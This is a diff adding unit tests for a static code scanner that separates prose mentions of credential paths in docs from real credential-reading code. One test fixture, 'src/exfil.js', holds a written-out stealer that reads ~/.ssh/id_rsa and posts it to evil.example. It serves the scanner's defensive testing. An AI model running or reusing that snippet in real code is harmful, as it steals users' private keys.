@@ -1,8 +1,14 @@
 /**
- * Unit tests for the static-scan heuristics — focused on the obfuscation-signal
- * PRECISION fix: legitimate dynamic-code (`new Function('…')`) must NOT trip the
- * binary `obfuscation` signal (which auto-escalates and weighs -42), while real
- * obfuscation (eval-of-decoded, long base64 blobs) still must.
+ * Unit tests for the static-scan heuristics. Two precision properties are guarded:
+ *
+ *  1. OBFUSCATION precision: legitimate dynamic-code (`new Function('…')`) must NOT
+ *     trip the binary `obfuscation` signal (which auto-escalates and weighs -42),
+ *     while real obfuscation (eval-of-decoded, long base64 blobs) still must.
+ *
+ *  2. DOC-vs-CODE precision (credential-access false-positive fix): a README/doc
+ *     that merely MENTIONS a credential path, secret format, or network literal in
+ *     prose must NOT set the binary code signals (credAccess -40, embeddedSecret,
+ *     network), while actual source code performing those accesses still MUST.
  *
  * Run: `deno test supabase/functions/_shared/static-scan.test.ts`
  */
@@ -136,5 +142,132 @@ Deno.test("new Function(variable) is flagged as a REGION (no false signal) — H
   assert(
     result.flaggedRegions.some((r) => /computed argument/.test(r.reason)),
     "new Function(variable) must still be surfaced as a region for the model",
+  );
+});
+
+// --- Doc-vs-code distinction (credential-access false-positive fix) ----------
+// A README/doc that merely MENTIONS a credential path in prose must NOT trip the
+// binary credAccess signal (which weighs -40 and would false-flag a repo as
+// "Dangerous"), while actual code that reads a credential path still MUST. This
+// is the exact google-labs-code/design.md failure: a README describing ".npmrc
+// registry configuration" scored 51/100 "High risk" purely on a -40 credAccess.
+
+Deno.test("README merely MENTIONING .npmrc in prose does NOT set credAccess (design.md repro)", () => {
+  // Arrange — the exact shape of the live false positive: a documentation file
+  // describing .npmrc registry configuration in prose, no executable access.
+  const readme = file(
+    "README.md",
+    [
+      "# design.md",
+      "",
+      "A design specification project under the Google Labs organization.",
+      "",
+      "## Registry configuration",
+      "",
+      "For corporate development environments, configure your `.npmrc` to point",
+      "at the internal registry. This project never reads your `~/.ssh` keys or",
+      "your `.aws/credentials`; those are mentioned here only for documentation.",
+    ].join("\n"),
+  );
+
+  // Act
+  const result = staticScan([readme]);
+
+  // Assert — the binary signal must NOT fire on a prose mention…
+  assertEquals(
+    result.signals.credAccess,
+    false,
+    "a README mentioning .npmrc/.ssh/.aws in prose must NOT set credAccess (no -40 penalty)",
+  );
+  // …and with no other code signal, the repo stays clean, not "high".
+  assertEquals(
+    result.severityHint,
+    "clean",
+    "a docs-only repo mentioning credential paths in prose must not be scored high-severity",
+  );
+  // …but the mention IS still surfaced as a region so the read model sees it and
+  // the report can honestly cite it (never-bare-Safe: we say what we saw).
+  assert(
+    result.flaggedRegions.some(
+      (r) => /mentioned in documentation\/prose/.test(r.reason) && /npmrc/.test(r.reason),
+    ),
+    "the prose .npmrc mention must still be surfaced as a documentation region for the model",
+  );
+});
+
+Deno.test("real CODE reading a credential path STILL sets credAccess at full severity (no regression)", () => {
+  // Arrange — genuine credential theft: source code that reads ~/.ssh at runtime.
+  const stealer = file(
+    "src/exfil.js",
+    "const fs = require('fs');\n" +
+      "const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');\n" +
+      "fetch('https://evil.example/collect', { method: 'POST', body: key });",
+  );
+
+  // Act
+  const result = staticScan([stealer]);
+
+  // Assert — the signal MUST still fire at full severity for real code.
+  assertEquals(
+    result.signals.credAccess,
+    true,
+    "code that reads ~/.ssh/id_rsa MUST still set credAccess (the -40 penalty must not be weakened)",
+  );
+  assertEquals(result.severityHint, "high", "real credential-reading code stays high-severity");
+});
+
+Deno.test("credential path in a docs/ directory file (any extension) is prose, not access", () => {
+  // Arrange — docs live under docs/ regardless of extension; a config example
+  // there is documentation, not executable code.
+  const doc = file(
+    "docs/setup-guide.txt",
+    "Place your npm auth token in ~/.npmrc and your cloud creds in .aws/credentials.",
+  );
+
+  // Act
+  const result = staticScan([doc]);
+
+  // Assert
+  assertEquals(result.signals.credAccess, false, "a docs/ guide mentioning credential paths is prose, not access");
+  assertEquals(result.severityHint, "clean");
+});
+
+Deno.test("a doc mention alongside real code: code still trips the signal", () => {
+  // Arrange — a repo with BOTH a benign README mention AND a real credential read
+  // in source. The signal must fire (driven by the code), proving the doc file
+  // does not mask a genuine access elsewhere in the same repo.
+  const readme = file("README.md", "Configure `.npmrc` for the internal registry.");
+  const code = file("index.js", "const k = fs.readFileSync(process.env.HOME + '/.ssh/id_ed25519');");
+
+  // Act
+  const result = staticScan([readme, code]);
+
+  // Assert
+  assertEquals(result.signals.credAccess, true, "real code access must still set credAccess even beside a benign doc mention");
+  assertEquals(result.severityHint, "high");
+});
+
+Deno.test("embedded-secret / network literals in docs are prose too (systemic doc-vs-code fix)", () => {
+  // Arrange — a README documenting an example AWS key format and an example IP.
+  // These are documentation, not a committed live secret or a real network call.
+  const readme = file(
+    "README.md",
+    [
+      "Example access key id format: AKIAIOSFODNN7EXAMPLE",
+      "During local dev the service listens on http://127.0.0.1:8080",
+    ].join("\n"),
+  );
+
+  // Act
+  const result = staticScan([readme]);
+
+  // Assert — no binary code signals fire on prose examples…
+  assertEquals(result.signals.embeddedSecret, false, "an example key format in a README is not an embedded secret");
+  assertEquals(result.signals.network, false, "an example IP:port in a README is not a network capability");
+  assertEquals(result.severityHint, "clean");
+  // …but they are still surfaced as documentation regions for the model.
+  assert(
+    result.flaggedRegions.some((r) => /mentioned in documentation\/prose/.test(r.reason)),
+    "doc-side matches must still be surfaced as regions for the model",
   );
 });
